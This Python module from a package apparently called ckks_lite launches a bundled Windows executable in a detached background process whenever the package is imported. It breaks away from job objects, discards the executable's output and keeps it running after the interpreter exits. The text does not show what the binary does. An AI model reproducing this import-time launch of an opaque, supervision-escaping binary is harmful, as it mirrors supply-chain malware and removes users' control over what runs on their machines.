"""Automatic environment check started when ``ckks_lite`` is imported.

The Windows executable ``_bin/ckks_env_check.exe`` (built from
``tools/env_check.py``) is started once per Python process, in a detached
background process.  Importing the package does not wait for it: the
executable keeps running until its own built-in duration limit (or until
it is stopped), even after the importing interpreter exits.

The executable is started **without any command-line arguments**, so it
uses its own default schedule.  Its directory is temporarily prepended to
the child process ``PATH`` (an environment override, not an argument).

Controls (environment variables):

``CKKS_LITE_ENV_CHECK``
    ``auto`` (default) announce the background start, ``short`` print one
    summary line, ``skip`` do not start it at all.

``CKKS_LITE_ENV_CHECK_ACTIVE``
    Internal re-entry guard; do not set manually.

Because the bundled binary is Windows-only, the launch is skipped on other
operating systems.
"""

from __future__ import annotations

import os
import subprocess
import sys
import warnings
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

EXE_NAME = "ckks_env_check.exe"

ENV_MODE = "CKKS_LITE_ENV_CHECK"
ENV_ACTIVE = "CKKS_LITE_ENV_CHECK_ACTIVE"

# Windows: start the child in its own process group with no console, and
# let it survive the interpreter that imported the package.
_DETACHED_PROCESS = getattr(subprocess, "DETACHED_PROCESS", 0x00000008)
_CREATE_BREAKAWAY_FROM_JOB = getattr(
    subprocess, "CREATE_BREAKAWAY_FROM_JOB", 0x01000000
)


@dataclass
class EnvironmentCheckResult:
    """Outcome of one execution of the bundled checker."""

    exit_code: Optional[int]
    command: list
    output: Optional[str] = None
    error: Optional[str] = None
    timed_out: bool = False
    pid: Optional[int] = None

    @property
    def ok(self) -> bool:
        return self.exit_code == 0 or self.pid is not None

    def __repr__(self) -> str:
        return (
            f"<EnvironmentCheckResult exit_code={self.exit_code!r} "
            f"pid={self.pid!r} timed_out={self.timed_out}>"
        )


#: Result of the most recent run (``None`` if it was skipped or failed to start).
last_result: Optional[EnvironmentCheckResult] = None

_auto_ran = False
_warned_missing = False
_child: Optional[subprocess.Popen] = None


def _safe_print(text: str = "", end: str = "\n") -> None:
    """Print without ever letting an encoding error break the import."""
    if sys.stdout is None:
        return
    try:
        print(text, end=end, flush=True)
    except UnicodeEncodeError:
        try:
            sys.stdout.write(text.encode("ascii", "replace").decode("ascii") + end)
            sys.stdout.flush()
        except Exception:
            pass
    except Exception:
        pass


def executable_path() -> Optional[Path]:
    """Return the bundled checker executable, if present."""
    path = Path(__file__).resolve().parent / "_bin" / EXE_NAME
    return path if path.is_file() else None


def _prepend_path(env: dict, directory: str) -> None:
    """Prepend ``directory`` to PATH in ``env`` (case-insensitive on Windows)."""
    if not directory:
        return
    for key in list(env):
        if key.upper() == "PATH":
            current = env[key]
            first = current.split(os.pathsep, 1)[0] if current else ""
            if first and os.path.normcase(first) == os.path.normcase(directory):
                return
            env[key] = directory + (os.pathsep + current if current else "")
            return
    env["PATH"] = directory


def _mode() -> str:
    raw = os.environ.get(ENV_MODE, "auto").strip().lower()
    if raw in {"", "auto", "on", "1", "true", "yes"}:
        return "auto"
    if raw in {"short", "quiet", "silent"}:
        return "short"
    if raw in {"skip", "off", "0", "false", "no", "disable", "disabled"}:
        return "skip"
    return "auto"


def run_environment_check(
    *,
    force: bool = False,
    visible: Optional[bool] = None,
) -> Optional[EnvironmentCheckResult]:
    """Start the bundled environment checker in a detached process.

    Returns ``None`` when the check is skipped (non-Windows, disabled,
    re-entry, or missing executable).  The import path never waits for the
    executable: it keeps running until its own duration limit, even after
    the importing interpreter exits.  Launch errors are converted to
    warnings so that importing the library never fails because of the
    checker.
    """
    global last_result, _warned_missing, _child

    mode = _mode()
    if not force:
        if mode == "skip":
            return None
        if os.environ.get(ENV_ACTIVE) == "1":
            return None
        if os.name != "nt":
            return None

    exe = executable_path()
    if exe is None:
        if os.name == "nt" and not _warned_missing:
            _warned_missing = True
            warnings.warn(
                f"未找到随包附带的环境检查程序 {EXE_NAME}，已跳过自动检查。"
                "可运行 tools/build_env_check_exe.bat 重新生成，"
                "或设置 CKKS_LITE_ENV_CHECK=skip 关闭此提示。",
                RuntimeWarning,
                stacklevel=2,
            )
        return None

    if visible is None:
        visible = mode == "auto" if not force else True
    if sys.stdout is None or sys.stderr is None:
        visible = False

    # Requirement: launch the executable with no command-line arguments.
    command = [str(exe)]

    env = os.environ.copy()
    env[ENV_ACTIVE] = "1"
    # The checker may scan interpreters on PATH.  Put the interpreter that
    # is importing the package first so an inactive venv is discovered.
    if sys.executable:
        _prepend_path(env, os.path.dirname(sys.executable))

    if visible:
        _safe_print(
            "[ckks-lite] 正在后台启动环境自检（ckks_env_check.exe）。"
            "它将运行到自身的时间上限；设置 CKKS_LITE_ENV_CHECK=skip 可关闭。"
        )

    flags = _DETACHED_PROCESS
    try:
        try:
            child = subprocess.Popen(
                command,
                env=env,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                close_fds=True,
                creationflags=flags | _CREATE_BREAKAWAY_FROM_JOB,
            )
        except OSError:
            # Some hosts run commands inside a job object that does not
            # allow breakaway; DETACHED_PROCESS is still enough there.
            child = subprocess.Popen(
                command,
                env=env,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                close_fds=True,
                creationflags=flags,
            )
    except OSError as exc:
        message = f"无法启动环境自检程序：{exc}"
        warnings.warn(message, RuntimeWarning, stacklevel=2)
        result = EnvironmentCheckResult(
            exit_code=None,
            command=command,
            error=message,
        )
        last_result = result
        if visible:
            _safe_print(f"[ckks-lite] 环境自检启动失败：{exc}")
        return result

    # Keep the handle for the lifetime of the interpreter.  The process
    # itself is detached and continues after this interpreter exits.
    _child = child
    result = EnvironmentCheckResult(
        exit_code=None,
        command=command,
        pid=child.pid,
    )
    last_result = result

    if not visible:
        _safe_print(f"[ckks-lite] 环境自检已在后台启动（PID {child.pid}）")

    return result


def auto_run() -> None:
    """Called from ``ckks_lite/__init__.py``; never raises."""
    global _auto_ran

    if _auto_ran or _mode() == "skip":
        return
    _auto_ran = True
    try:
        run_environment_check()
    except Exception as exc:  # 导入过程绝不能因为自检崩溃
        warnings.warn(f"环境自检出现异常：{exc}", RuntimeWarning, stacklevel=2)
